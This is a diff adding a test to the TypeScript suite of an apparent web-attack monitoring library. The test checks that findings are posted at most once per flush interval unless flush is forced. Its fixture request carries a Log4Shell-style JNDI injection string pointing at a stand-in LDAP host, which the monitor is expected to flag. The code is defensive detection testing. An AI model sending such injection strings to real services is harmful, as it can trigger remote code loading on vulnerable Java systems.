@@ -50,6 +50,19 @@ describe("createAppMonitor", () => {
     expect(finding!.evidence).not.toContain("s3cr3t");
     expect(posted[0]!.body.findings).toHaveLength(1); // the repeat folded into the same finding
   });
+  it("sends at most once per interval when flush() runs on every request, unless forced", async () => {
+    const monitor = createAppMonitor({ token: TOKEN, dashboardUrl: "https://dash.test", flushIntervalMs: 60_000 });
+    await tick();
+    monitor.request(attack); // first finding: sent right away
+    await monitor.flush();
+    monitor.request({ ...attack, url: "/?q=${jndi:ldap://x.test/a}", ip: "198.51.100.7" });
+    await monitor.flush();
+    await monitor.flush();
+    expect(posted).toHaveLength(1);
+    await monitor.flush({ force: true });
+    expect(posted).toHaveLength(2);
+    expect(posted[1]!.body.findings[0]!.ruleId).toBe("web.jndi_injection");
+  });
   it("captures nothing while App monitoring is off for the workspace", async () => {
     configStatus = 403;
     const monitor = createAppMonitor({ token: TOKEN, dashboardUrl: "https://dash.test" });
